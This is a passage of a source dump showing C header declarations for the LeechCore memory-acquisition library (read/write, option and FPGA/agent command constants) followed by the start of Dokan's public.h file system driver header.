    * pMEM. The result should be freed by LcFree when its no longer needed.
    * -- cMEMs
    * -- pppMEMs = pointer to receive ppMEMs
    * -- return
    */
    _Success_(return)
        EXPORTED_FUNCTION BOOL LcAllocScatter1(
            _In_ DWORD cMEMs,
            _Out_ PPMEM_SCATTER *pppMEMs
        );

    /*
    * Allocate and pre-initialize empty MEMs excluding the 0x1000 buffer which
    * will be accounted towards the pbData buffer in a contiguous way.
    * The result should be freed by LcFree when its no longer needed.
    * -- cbData = size of pbData (must be cMEMs * 0x1000)
    * -- pbData = buffer used for MEM.pb
    * -- cMEMs
    * -- pppMEMs = pointer to receive ppMEMs
    * -- return
    */
    _Success_(return)
        EXPORTED_FUNCTION BOOL LcAllocScatter2(
            _In_ DWORD cbData,
            _Inout_updates_opt_(cbData) PBYTE pbData,
            _In_ DWORD cMEMs,
            _Out_ PPMEM_SCATTER *pppMEMs
        );

    /*
    * Allocate and pre-initialize empty MEMs excluding the 0x1000 buffer which
    * will be accounted towards the pbData buffer in a contiguous way.
    * -- pbDataFirstPage = optional buffer of first page
    * -- pbDataLastPage = optional buffer of last page
    * -- cbData = size of pbData
    * -- pbData = buffer used for MEM.pb except first/last if exists
    * -- cMEMs
    * -- pppMEMs = pointer to receive ppMEMs
    * -- return
    */
    _Success_(return)
        EXPORTED_FUNCTION BOOL LcAllocScatter3(
            _Inout_updates_opt_(0x1000) PBYTE pbDataFirstPage,
            _Inout_updates_opt_(0x1000) PBYTE pbDataLastPage,
            _In_ DWORD cbData,
            _Inout_updates_opt_(cbData) PBYTE pbData,
            _In_ DWORD cMEMs,
            _Out_ PPMEM_SCATTER *pppMEMs
        );

    /*
    * Read memory in a scattered non-contiguous way. This is recommended for reads.
    * -- hLC
    * -- cMEMs
    * -- ppMEMs
    */
    EXPORTED_FUNCTION VOID LcReadScatter(
        _In_ HANDLE hLC,
        _In_ DWORD cMEMs,
        _Inout_ PPMEM_SCATTER ppMEMs
    );

    /*
    * Read memory in a contiguous way. Note that if multiple memory segments are
    * to be read LcReadScatter() may be more efficient.
    * -- hLC,
    * -- pa
    * -- cb
    * -- pb
    * -- return
    */
    _Success_(return)
        EXPORTED_FUNCTION BOOL LcRead(
            _In_ HANDLE hLC,
            _In_ QWORD pa,
            _In_ DWORD cb,
            _Out_writes_(cb) PBYTE pb
        );

    /*
    * Write memory in a scattered non-contiguous way.
    * -- hLC
    * -- cMEMs
    * -- ppMEMs
    */
    EXPORTED_FUNCTION VOID LcWriteScatter(
        _In_ HANDLE hLC,
        _In_ DWORD cMEMs,
        _Inout_ PPMEM_SCATTER ppMEMs
    );

    /*
    * Write memory in a contiguous way.
    * -- hLC
    * -- pa
    * -- cb
    * -- pb
    * -- return
    */
    _Success_(return)
        EXPORTED_FUNCTION BOOL LcWrite(
            _In_ HANDLE hLC,
            _In_ QWORD pa,
            _In_ DWORD cb,
            _In_reads_(cb) PBYTE pb
        );



    //-----------------------------------------------------------------------------
    // Get/Set/Command functionality may be used to query and/or update LeechCore
    // or its devices in various ways.
    //-----------------------------------------------------------------------------

    /*
    * Set an option as defined by LC_OPT_*. (R option).
    * -- hLC
    * -- fOption = LC_OPT_*
    * -- cbData
    * -- pbData
    * -- pcbData
    */
    _Success_(return)
        EXPORTED_FUNCTION BOOL LcGetOption(
            _In_ HANDLE hLC,
            _In_ QWORD fOption,
            _Out_ PQWORD pqwValue
        );

    /*
    * Get an option as defined by LC_OPT_*. (W option).
    * -- hLC
    * -- fOption = LC_OPT_*
    * -- cbData
    * -- pbData
    */
    _Success_(return)
        EXPORTED_FUNCTION BOOL LcSetOption(
            _In_ HANDLE hLC,
            _In_ QWORD fOption,
            _In_ QWORD qwValue
        );

    /*
    * Execute a command and retrieve a result (if any) at the same time.
    * NB! If *ppbDataOut contains a memory allocation on exit this should be free'd
    *     by calling LcMemFree().
    * CALLER LcFreeMem: *ppbDataOut
    * -- hLC
    * -- fCommand = LC_CMD_*
    * -- cbDataIn
    * -- pbDataIn
    * -- ppbDataOut
    * -- pcbDataOut
    */
    _Success_(return)
        EXPORTED_FUNCTION BOOL LcCommand(
            _In_ HANDLE hLC,
            _In_ QWORD fCommand,
            _In_ DWORD cbDataIn,
            _In_reads_opt_(cbDataIn) PBYTE pbDataIn,
            _Out_opt_ PBYTE *ppbDataOut,
            _Out_opt_ PDWORD pcbDataOut
        );

#define LC_OPT_CORE_PRINTF_ENABLE                   0x4000000100000000  // RW
#define LC_OPT_CORE_VERBOSE                         0x4000000200000000  // RW
#define LC_OPT_CORE_VERBOSE_EXTRA                   0x4000000300000000  // RW
#define LC_OPT_CORE_VERBOSE_EXTRA_TLP               0x4000000400000000  // RW
#define LC_OPT_CORE_VERSION_MAJOR                   0x4000000500000000  // R
#define LC_OPT_CORE_VERSION_MINOR                   0x4000000600000000  // R
#define LC_OPT_CORE_VERSION_REVISION                0x4000000700000000  // R
#define LC_OPT_CORE_ADDR_MAX                        0x1000000800000000  // R
#define LC_OPT_CORE_STATISTICS_CALL_COUNT           0x4000000900000000  // R [lo-dword: LC_STATISTICS_ID_*]
#define LC_OPT_CORE_STATISTICS_CALL_TIME            0x4000000a00000000  // R [lo-dword: LC_STATISTICS_ID_*]

#define LC_OPT_MEMORYINFO_VALID                     0x0200000100000000  // R
#define LC_OPT_MEMORYINFO_FLAG_32BIT                0x0200000300000000  // R
#define LC_OPT_MEMORYINFO_FLAG_PAE                  0x0200000400000000  // R
#define LC_OPT_MEMORYINFO_OS_VERSION_MINOR          0x0200000500000000  // R
#define LC_OPT_MEMORYINFO_OS_VERSION_MAJOR          0x0200000600000000  // R
#define LC_OPT_MEMORYINFO_OS_DTB                    0x0200000700000000  // R
#define LC_OPT_MEMORYINFO_OS_PFN                    0x0200000800000000  // R
#define LC_OPT_MEMORYINFO_OS_PsLoadedModuleList     0x0200000900000000  // R
#define LC_OPT_MEMORYINFO_OS_PsActiveProcessHead    0x0200000a00000000  // R
#define LC_OPT_MEMORYINFO_OS_MACHINE_IMAGE_TP       0x0200000b00000000  // R
#define LC_OPT_MEMORYINFO_OS_NUM_PROCESSORS         0x0200000c00000000  // R
#define LC_OPT_MEMORYINFO_OS_SYSTEMTIME             0x0200000d00000000  // R
#define LC_OPT_MEMORYINFO_OS_UPTIME                 0x0200000e00000000  // R
#define LC_OPT_MEMORYINFO_OS_KERNELBASE             0x0200000f00000000  // R
#define LC_OPT_MEMORYINFO_OS_KERNELHINT             0x0200001000000000  // R
#define LC_OPT_MEMORYINFO_OS_KdDebuggerDataBlock    0x0200001100000000  // R

#define LC_OPT_FPGA_PROBE_MAXPAGES                  0x0300000100000000  // RW
#define LC_OPT_FPGA_MAX_SIZE_RX                     0x0300000300000000  // RW
#define LC_OPT_FPGA_MAX_SIZE_TX                     0x0300000400000000  // RW
#define LC_OPT_FPGA_DELAY_PROBE_READ                0x0300000500000000  // RW - uS
#define LC_OPT_FPGA_DELAY_PROBE_WRITE               0x0300000600000000  // RW - uS
#define LC_OPT_FPGA_DELAY_WRITE                     0x0300000700000000  // RW - uS
#define LC_OPT_FPGA_DELAY_READ                      0x0300000800000000  // RW - uS
#define LC_OPT_FPGA_RETRY_ON_ERROR                  0x0300000900000000  // RW
#define LC_OPT_FPGA_DEVICE_ID                       0x0300008000000000  // RW - bus:dev:fn (ex: 04:00.0 == 0x0400).
#define LC_OPT_FPGA_FPGA_ID                         0x0300008100000000  // R
#define LC_OPT_FPGA_VERSION_MAJOR                   0x0300008200000000  // R
#define LC_OPT_FPGA_VERSION_MINOR                   0x0300008300000000  // R
#define LC_OPT_FPGA_ALGO_TINY                       0x0300008400000000  // RW - 1/0 use tiny 128-byte/tlp read algorithm.
#define LC_OPT_FPGA_ALGO_SYNCHRONOUS                0x0300008500000000  // RW - 1/0 use synchronous (old) read algorithm.
#define LC_OPT_FPGA_CFGSPACE_XILINX                 0x0300008600000000  // RW - [lo-dword: register address in bytes] [bytes: 0-3: data, 4-7: byte_enable(if wr/set); top bit = cfg_mgmt_wr_rw1c_as_rw]
#define LC_OPT_FPGA_TLP_READ_CB_WITHINFO            0x0300009000000000  // RW - 1/0 call TLP read callback with additional string info in szInfo
#define LC_OPT_FPGA_TLP_READ_CB_FILTERCPL           0x0300009100000000  // RW - 1/0 call TLP read callback with memory read completions from read calls filtered
#define LC_OPT_FPGA_TLP_READ_CB_BACKGROUND_THREAD   0x0300009200000000  // RW - 1/0 call TLP read callback auto-read with background thread [requires active callback function]

#define LC_CMD_FPGA_WRITE_TLP                       0x0000010100000000  // R  - !!! DEPRECATED DO NOT USE !!! - USE LC_CMD_FPGA_TLP_WRITE_SINGLE!
#define LC_CMD_FPGA_LISTEN_TLP                      0x0000010200000000  // R  - !!! DEPRECATED DO NOT USE !!!
#define LC_CMD_FPGA_PCIECFGSPACE                    0x0000010300000000  // R
#define LC_CMD_FPGA_CFGREGPCIE                      0x0000010400000000  // RW - [lo-dword: register address]
#define LC_CMD_FPGA_CFGREGCFG                       0x0000010500000000  // RW - [lo-dword: register address]
#define LC_CMD_FPGA_CFGREGDRP                       0x0000010600000000  // RW - [lo-dword: register address]
#define LC_CMD_FPGA_CFGREGCFG_MARKWR                0x0000010700000000  // W  - write with mask [lo-dword: register address] [bytes: 0-1: data, 2-3: mask]
#define LC_CMD_FPGA_CFGREGPCIE_MARKWR               0x0000010800000000  // W  - write with mask [lo-dword: register address] [bytes: 0-1: data, 2-3: mask]
#define LC_CMD_FPGA_CFGREG_DEBUGPRINT               0x0000010a00000000  // N/A
#define LC_CMD_FPGA_PROBE                           0x0000010b00000000  // RW
#define LC_CMD_FPGA_CFGSPACE_SHADOW_RD              0x0000010c00000000  // R
#define LC_CMD_FPGA_CFGSPACE_SHADOW_WR              0x0000010d00000000  // W  - [lo-dword: config space write base address]
#define LC_CMD_FPGA_TLP_WRITE_SINGLE                0x0000011000000000  // R  - write single tlp BYTE:s
#define LC_CMD_FPGA_TLP_WRITE_MULTIPLE              0x0000011100000000  // R  - write multiple LC_TLP:s
#define LC_CMD_FPGA_TLP_TOSTRING                    0x0000011200000000  // RW - convert single TLP to LPSTR; *pcbDataOut includes NULL terminator.
#define LC_CMD_FPGA_TLP_READ_FUNCTION_CALLBACK      0x0000011300000000  // W  - set/unset custom TLP read callback function and fetch TLPs (pbDataIn == PLC_TLP_CALLBACK).

#define LC_CMD_FILE_DUMPHEADER_GET                  0x0000020100000000  // R

#define LC_CMD_STATISTICS_GET                       0x4000010000000000  // R
#define LC_CMD_MEMMAP_GET                           0x4000020000000000  // R  - MEMMAP as LPSTR
#define LC_CMD_MEMMAP_SET                           0x4000030000000000  // W  - MEMMAP as LPSTR
#define LC_CMD_MEMMAP_GET_STRUCT                    0x4000040000000000  // R  - MEMMAP as LC_MEMMAP_ENTRY[]
#define LC_CMD_MEMMAP_SET_STRUCT                    0x4000050000000000  // W  - MEMMAP as LC_MEMMAP_ENTRY[]

#define LC_CMD_AGENT_EXEC_PYTHON                    0x8000000100000000  // RW - [lo-dword: optional timeout in ms]
#define LC_CMD_AGENT_EXIT_PROCESS                   0x8000000200000000  //    - [lo-dword: process exit code]
#define LC_CMD_AGENT_VFS_LIST                       0x8000000300000000  // RW
#define LC_CMD_AGENT_VFS_READ                       0x8000000400000000  // RW
#define LC_CMD_AGENT_VFS_WRITE                      0x8000000500000000  // RW
#define LC_CMD_AGENT_VFS_OPT_GET                    0x8000000600000000  // RW
#define LC_CMD_AGENT_VFS_OPT_SET                    0x8000000700000000  // RW

#define LC_CMD_AGENT_VFS_REQ_VERSION                0xfeed0001
#define LC_CMD_AGENT_VFS_RSP_VERSION                0xfeee0001

#define LC_STATISTICS_VERSION                       0xe1a10002
#define LC_STATISTICS_ID_OPEN                       0x00
#define LC_STATISTICS_ID_READ                       0x01
#define LC_STATISTICS_ID_READSCATTER                0x02
#define LC_STATISTICS_ID_WRITE                      0x03
#define LC_STATISTICS_ID_WRITESCATTER               0x04
#define LC_STATISTICS_ID_GETOPTION                  0x05
#define LC_STATISTICS_ID_SETOPTION                  0x06
#define LC_STATISTICS_ID_COMMAND                    0x07
#define LC_STATISTICS_ID_MAX                        0x07

    typedef struct tdLC_CMD_AGENT_VFS_REQ {
        DWORD dwVersion;
        DWORD _FutureUse;
        CHAR uszPathFile[2*MAX_PATH];   // file path to list/read/write
        union {
            QWORD qwOffset;             // offset to read/write
            QWORD fOption;              // option to get/set (qword data in *pb)
        };
        DWORD dwLength;                 // length to read
        DWORD cb;
        BYTE pb[0];
    } LC_CMD_AGENT_VFS_REQ, *PLC_CMD_AGENT_VFS_REQ;

    typedef struct tdLC_CMD_AGENT_VFS_RSP {
        DWORD dwVersion;
        DWORD dwStatus;                 // ntstatus of read/write
        DWORD cbReadWrite;              // number of bytes read/written
        DWORD _FutureUse[2];
        DWORD cb;
        BYTE pb[0];
    } LC_CMD_AGENT_VFS_RSP, *PLC_CMD_AGENT_VFS_RSP;

    static LPCSTR LC_STATISTICS_NAME[] = {
        "LcOpen",
        "LcRead",
        "LcReadScatter",
        "LcWrite",
        "LcWriteScatter",
        "LcGetOption",
        "LcSetOption",
        "LcCommand",
    };

    typedef struct tdLC_STATISTICS {
        DWORD dwVersion;
        DWORD _Reserved;
        QWORD qwFreq;
        struct {
            QWORD c;
            QWORD tm;   // total time in qwFreq ticks
        } Call[LC_STATISTICS_ID_MAX + 1];
    } LC_STATISTICS, *PLC_STATISTICS;

    typedef struct tdLC_MEMMAP_ENTRY {
        QWORD pa;
        QWORD cb;
        QWORD paRemap;
    } LC_MEMMAP_ENTRY, *PLC_MEMMAP_ENTRY;

    typedef struct tdLC_TLP {
        DWORD cb;
        DWORD _Reserved1;
        PBYTE pb;
    } LC_TLP, *PLC_TLP;

    /*
    * Custom FPGA-only callback function to be called whenever a TLP is received if
    * set by command LC_CMD_FPGA_TLP_READ_FUNCTION_CALLBACK.
    * NOTE! CALLBACK FUNCTION MUST NEVER CALL LEECHCORE DUE TO RISK OF DEADLOCK!
    */
    typedef VOID(*PLC_TLP_READ_FUNCTION_CALLBACK)(
        _In_opt_ PVOID ctx,
        _In_ DWORD cbTlp,
        _In_ PBYTE pbTlp,
        _In_opt_ DWORD cbInfo,
        _In_opt_ LPSTR szInfo
        );

    typedef struct tdLC_TLP_CALLBACK {
        PVOID ctx;
        PLC_TLP_READ_FUNCTION_CALLBACK pfn;
    } LC_TLP_CALLBACK, *PLC_TLP_CALLBACK;

#ifdef __cplusplus
}
#endif /* __cplusplus */
#endif /* __LEECHCORE_H__ */

```

`includes/public.h`:

```h
/*
  Dokan : user-mode file system library for Windows

  Copyright (C) 2017 - 2021 Google, Inc.
  Copyright (C) 2015 - 2019 Adrien J. <liryna.stark@gmail.com> and Maxime C. <maxime@islog.com>
  Copyright (C) 2007 - 2011 Hiroki Asakawa <info@dokan-dev.net>

  http://dokan-dev.github.io

This program is free software; you can redistribute it and/or modify it under
the terms of the GNU Lesser General Public License as published by the Free
Software Foundation; either version 3 of the License, or (at your option) any
later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU Lesser General Public License along
with this program. If not, see <http://www.gnu.org/licenses/>.
*/

#ifndef PUBLIC_H_
#define PUBLIC_H_

#ifndef DOKAN_MAJOR_API_VERSION
#define DOKAN_MAJOR_API_VERSION L"2"
#include <minwindef.h>
#endif

#define DOKAN_DRIVER_VERSION 0x0000190

#define EVENT_CONTEXT_MAX_SIZE (1024 * 32)
// This is arbitrary. There isn't really an absolute max, but we marshal it in
// a fixed-size buffer.
#define VOLUME_SECURITY_DESCRIPTOR_MAX_SIZE (1024 * 16)

#define FSCTL_GET_VERSION \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_SET_DEBUG_MODE \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_EVENT_RELEASE \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_EVENT_START \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_EVENT_WRITE \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x806, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

#define FSCTL_RESET_TIMEOUT \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_GET_ACCESS_TOKEN \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_EVENT_MOUNTPOINT_LIST \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_MOUNTPOINT_CLEANUP                                               \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)

// DeviceIoControl code to send to a keepalive handle to activate it (see the
// documentation for the keepalive flags in the DokanFCB struct).
#define FSCTL_ACTIVATE_KEEPALIVE                                               \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)

// DeviceIoControl code to send path notification request.
#define FSCTL_NOTIFY_PATH                                                      \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)

// DeviceIoControl code to retrieve the VOLUME_METRICS struct for the targeted
// volume.
#define FSCTL_GET_VOLUME_METRICS \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_EVENT_PROCESS_N_PULL                                                     \
  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define DRIVER_FUNC_INSTALL 0x01
#define DRIVER_FUNC_REMOVE 0x02

#define DOKAN_MOUNTED 1
#define DOKAN_USED 2
#define DOKAN_START_FAILED 3

#define DOKAN_DEVICE_MAX 10

#define DOKAN_DEFAULT_SECTOR_SIZE 512
#define DOKAN_DEFAULT_ALLOCATION_UNIT_SIZE 512
#define DOKAN_DEFAULT_DISK_SIZE 1024 * 1024 * 1024

// used in CCB->Flags and FCB->Flags
#define DOKAN_FILE_DIRECTORY 1
#define DOKAN_FILE_DELETED 2
#define DOKAN_FILE_OPENED 4
#define DOKAN_DIR_MATCH_ALL 8
#define DOKAN_DELETE_ON_CLOSE 16
#define DOKAN_PAGING_IO 32
#define DOKAN_SYNCHRONOUS_IO 64
#define DOKAN_WRITE_TO_END_OF_FILE 128
#define DOKAN_NOCACHE 256
#define DOKAN_RETRY_CREATE 512
#define DOKAN_EVER_USED_IN_NOTIFY_LIST 1024
#define DOKAN_FILE_CHANGE_LAST_WRITE 2048

// used in DOKAN_START->DeviceType
#define DOKAN_DISK_FILE_SYSTEM 0
#define DOKAN_NETWORK_FILE_SYSTEM 1

// Special files that are tagged for specfic FS purpose when their FCB is init.
// Note: This file names can no longer be used by userland FS correctly.
#define DOKAN_KEEPALIVE_FILE_NAME L"\\__drive_fs_keepalive"
#define DOKAN_NOTIFICATION_FILE_NAME L"\\drive_fs_notification"

// The minimum FCB garbage collection interval, below which the parameter is
// ignored (instantaneous deletion with an interval of 0 is more efficient than
// using the machinery with a tight interval).
#define MIN_FCB_GARBAGE_COLLECTION_INTERVAL 500

/*
 * This structure is used for copying UNICODE_STRING from the kernel mode driver
 * into the user mode driver.
 * https://msdn.microsoft.com/en-us/library/windows/hardware/ff564879(v=vs.85).aspx
 */
typedef struct _DOKAN_UNICODE_STRING_INTERMEDIATE {
  USHORT Length;
  USHORT MaximumLength;
  WCHAR Buffer[1];
} DOKAN_UNICODE_STRING_INTERMEDIATE, *PDOKAN_UNICODE_STRING_INTERMEDIATE;

/*
 * This structure is used for sending notify path information from the user mode
 * driver to the kernel mode driver. See below links for parameter details for
 * CompletionFilter and Action, and FsRtlNotifyFullReportChange call.
 * https://msdn.microsoft.com/en-us/library/windows/hardware/ff547026(v=vs.85).aspx
 * https://msdn.microsoft.com/en-us/library/windows/hardware/ff547041(v=vs.85).aspx
 */
typedef struct _DOKAN_NOTIFY_PATH_INTERMEDIATE {
  ULONG CompletionFilter;
  ULONG Action;
  USHORT Length;
  WCHAR Buffer[1];
} DOKAN_NOTIFY_PATH_INTERMEDIATE, *PDOKAN_NOTIFY_PATH_INTERMEDIATE;

/*
 * This structure is used for copying ACCESS_STATE from the kernel mode driver
 * into the user mode driver.
 * https://msdn.microsoft.com/en-us/library/windows/hardware/ff538840(v=vs.85).aspx
*/
typedef struct _DOKAN_ACCESS_STATE_INTERMEDIATE {
  BOOLEAN SecurityEvaluated;
  BOOLEAN GenerateAudit;
  BOOLEAN GenerateOnClose;
  BOOLEAN AuditPrivileges;
  ULONG Flags;
  ACCESS_MASK RemainingDesiredAccess;
  ACCESS_MASK PreviouslyGrantedAccess;
  ACCESS_MASK OriginalDesiredAccess;

  // Offset from the beginning of this structure to a SECURITY_DESCRIPTOR
  // if 0 that means there is no security descriptor
  ULONG SecurityDescriptorOffset;

  // Offset from the beginning of this structure to a
  // DOKAN_UNICODE_STRING_INTERMEDIATE
  ULONG UnicodeStringObjectNameOffset;

  // Offset from the beginning of this structure to a
  // DOKAN_UNICODE_STRING_INTERMEDIATE
  ULONG UnicodeStringObjectTypeOffset;
} DOKAN_ACCESS_STATE_INTERMEDIATE, *PDOKAN_ACCESS_STATE_INTERMEDIATE;

typedef struct _DOKAN_ACCESS_STATE {
  BOOLEAN SecurityEvaluated;
  BOOLEAN GenerateAudit;
  BOOLEAN GenerateOnClose;
  BOOLEAN AuditPrivileges;
  ULONG Flags;
  ACCESS_MASK RemainingDesiredAccess;
  ACCESS_MASK PreviouslyGrantedAccess;
  ACCESS_MASK OriginalDesiredAccess;
  PSECURITY_DESCRIPTOR SecurityDescriptor;
  UNICODE_STRING ObjectName;
  UNICODE_STRING ObjectType;
} DOKAN_ACCESS_STATE, *PDOKAN_ACCESS_STATE;

/*
 * This structure is used for copying IO_SECURITY_CONTEXT from the kernel mode
 * driver into the user mode driver.
 * https://msdn.microsoft.com/en-us/library/windows/hardware/ff550613(v=vs.85).aspx
 */
typedef struct _DOKAN_IO_SECURITY_CONTEXT_INTERMEDIATE {
  DOKAN_ACCESS_STATE_INTERMEDIATE AccessState;
  ACCESS_MASK DesiredAccess;
} DOKAN_IO_SECURITY_CONTEXT_INTERMEDIATE,
    *PDOKAN_IO_SECURITY_CONTEXT_INTERMEDIATE;

typedef struct _DOKAN_IO_SECURITY_CONTEXT {
  DOKAN_ACCESS_STATE AccessState;
  ACCESS_MASK DesiredAccess;
} DOKAN_IO_SECURITY_CONTEXT, *PDOKAN_IO_SECURITY_CONTEXT;

typedef struct _CREATE_CONTEXT {
  DOKAN_IO_SECURITY_CONTEXT_INTERMEDIATE SecurityContext;
  ULONG FileAttributes;
  ULONG CreateOptions;
  ULONG ShareAccess;
  ULONG FileNameLength;

  // Offset from the beginning of this structure to the string
  ULONG FileNameOffset;
} CREATE_CONTEXT, *PCREATE_CONTEXT;

typedef struct _CLEANUP_CONTEXT {
  ULONG FileNameLength;
  WCHAR FileName[1];

} CLEANUP_CONTEXT, *PCLEANUP_CONTEXT;

typedef struct _CLOSE_CONTEXT {
  ULONG FileNameLength;
  WCHAR FileName[1];

} CLOSE_CONTEXT, *PCLOSE_CONTEXT;

typedef struct _DIRECTORY_CONTEXT {
  ULONG FileInformationClass;
  ULONG FileIndex;
  ULONG BufferLength;
  ULONG DirectoryNameLength;
  ULONG SearchPatternLength;
  ULONG SearchPatternOffset;
  WCHAR DirectoryName[1];
  WCHAR SearchPatternBase[1];

} DIRECTORY_CONTEXT, *PDIRECTORY_CONTEXT;

typedef struct _READ_CONTEXT {
  LARGE_INTEGER ByteOffset;
  ULONG BufferLength;
  ULONG FileNameLength;
  WCHAR FileName[1];
} READ_CONTEXT, *PREAD_CONTEXT;

typedef struct _WRITE_CONTEXT {
  LARGE_INTEGER ByteOffset;
  ULONG BufferLength;
  ULONG BufferOffset;
  ULONG RequestLength;
  ULONG FileNameLength;
  WCHAR FileName[2];
  // "2" means to keep last null of contents to write
} WRITE_CONTEXT, *PWRITE_CONTEXT;

typedef struct _FILEINFO_CONTEXT {
  ULONG FileInformationClass;
  ULONG BufferLength;
  ULONG FileNameLength;
  WCHAR FileName[1];
} FILEINFO_CONTEXT, *PFILEINFO_CONTEXT;

typedef struct _SETFILE_CONTEXT {
  ULONG FileInformationClass;
  ULONG BufferLength;
  ULONG BufferOffset;
  ULONG FileNameLength;
  WCHAR FileName[1];
} SETFILE_CONTEXT, *PSETFILE_CONTEXT;

typedef struct _VOLUME_CONTEXT {
  ULONG FsInformationClass;
  ULONG BufferLength;
} VOLUME_CONTEXT, *PVOLUME_CONTEXT;

typedef struct _LOCK_CONTEXT {
  LARGE_INTEGER ByteOffset;
  LARGE_INTEGER Length;
  ULONG Key;
  ULONG FileNameLength;
  WCHAR FileName[1];
} LOCK_CONTEXT, *PLOCK_CONTEXT;

typedef struct _FLUSH_CONTEXT {
  ULONG FileNameLength;
  WCHAR FileName[1];
} FLUSH_CONTEXT, *PFLUSH_CONTEXT;

typedef struct _UNMOUNT_CONTEXT {
  WCHAR DeviceName[64];
  ULONG Option;
} UNMOUNT_CONTEXT, *PUNMOUNT_CONTEXT;

typedef struct _SECURITY_CONTEXT {
  SECURITY_INFORMATION SecurityInformation;
  ULONG BufferLength;
  ULONG FileNameLength;
  WCHAR FileName[1];
} SECURITY_CONTEXT, *PSECURITY_CONTEXT;

typedef struct _SET_SECURITY_CONTEXT {
  SECURITY_INFORMATION SecurityInformation;
  ULONG BufferLength;
  ULONG BufferOffset;
  ULONG FileNameLength;
  WCHAR FileName[1];
} SET_SECURITY_CONTEXT, *PSET_SECURITY_CONTEXT;

typedef struct _EVENT_CONTEXT {
  ULONG Length;
  ULONG MountId;
  ULONG SerialNumber;
  ULONG ProcessId;
  UCHAR MajorFunction;
  UCHAR MinorFunction;
  ULONG Flags;
  ULONG FileFlags;
  ULONG64 Context;
  union {
    DIRECTORY_CONTEXT Directory;
    READ_CONTEXT Read;
    WRITE_CONTEXT Write;
    FILEINFO_CONTEXT File;
    CREATE_CONTEXT Create;
    CLOSE_CONTEXT Close;
    SETFILE_CONTEXT SetFile;
    CLEANUP_CONTEXT Cleanup;
    LOCK_CONTEXT Lock;
    VOLUME_CONTEXT Volume;
    FLUSH_CONTEXT Flush;
    UNMOUNT_CONTEXT Unmount;
    SECURITY_CONTEXT Security;
    SET_SECURITY_CONTEXT SetSecurity;
  } Operation;
} EVENT_CONTEXT, *PEVENT_CONTEXT;

// The output from IOCTL_GET_VOLUME_METRICS.
typedef struct _VOLUME_METRICS {
  ULONG64 NormalFcbGarbageCollectionCycles;
  // A "cycle" can consist of multiple "passes".
  ULONG64 NormalFcbGarbageCollectionPasses;
  ULONG64 ForcedFcbGarbageCollectionPasses;
  ULONG64 FcbAllocations;
  ULONG64 FcbDeletions;
  // A "cancellation" is when a single FCB's garbage collection gets canceled.
  ULONG64 FcbGarbageCollectionCancellations;
  // Number of IRPs with a too large buffer that could not be registered for
  // being forward to userland.
  ULONG64 LargeIRPRegistrationCanceled;
} VOLUME_METRICS, *PVOLUME_METRICS;

#define WRITE_MAX_SIZE                                                         \
  (EVENT_CONTEXT_MAX_SIZE - sizeof(EVENT_CONTEXT) - 256 * sizeof(WCHAR))

#define DOKAN_EVENT_INFO_MIN_BUFFER_SIZE 8
#define DOKAN_EVENT_INFO_DEFAULT_BUFFER_SIZE (1024 * 4)

typedef struct _EVENT_INFORMATION {
  ULONG SerialNumber;
  NTSTATUS Status;
  ULONG Flags;
  union {
    struct {
      ULONG Index;
    } Directory;
    struct {
      ULONG Flags;
      ULONG Information;
    } Create;
    struct {
      LARGE_INTEGER CurrentByteOffset;
    } Read;
    struct {
      LARGE_INTEGER CurrentByteOffset;
    } Write;
    struct {
      UCHAR DeleteOnClose;
    } Delete;
    struct {
      ULONG Timeout;
    } ResetTimeout;
    struct {
      HANDLE Handle;
    } AccessToken;
  } Operation;
  ULONG64 Context;
  ULONG BufferLength;
  ULONG PullEventTimeoutMs;
  UCHAR Buffer[DOKAN_EVENT_INFO_MIN_BUFFER_SIZE];
} EVENT_INFORMATION, *PEVENT_INFORMATION;

// By default we pool EVENT_INFORMATION objects with a 4k buffer (1 page) as most read/writes are this size
// or smaller
#define DOKAN_EVENT_INFO_DEFAULT_SIZE                                          \
  (FIELD_OFFSET(EVENT_INFORMATION, Buffer) +                                   \
   DOKAN_EVENT_INFO_DEFAULT_BUFFER_SIZE)

// Dokan mount options
#define DOKAN_EVENT_ALTERNATIVE_STREAM_ON                           1
#define DOKAN_EVENT_WRITE_PROTECT                                   (1 << 1)
#define DOKAN_EVENT_REMOVABLE                                       (1 << 2)
#define DOKAN_EVENT_MOUNT_MANAGER                                   (1 << 3)
#define DOKAN_EVENT_CURRENT_SESSION                                 (1 << 4)
#define DOKAN_EVENT_FILELOCK_USER_MODE                              (1 << 5)
// CaseSenitive FileName: NTFS can look to be case-insensitive
// but in some situation it can also be case-sensitive :
// * NTFS keep the filename casing used during Create internally.
// * Open "MyFile" on NTFS can open "MYFILE" if it exists.
// * FILE_FLAG_POSIX_SEMANTICS (IRP_MJ_CREATE: SL_CASE_SENSITIVE)
//   can be used during Create to make the lookup case-sensitive.
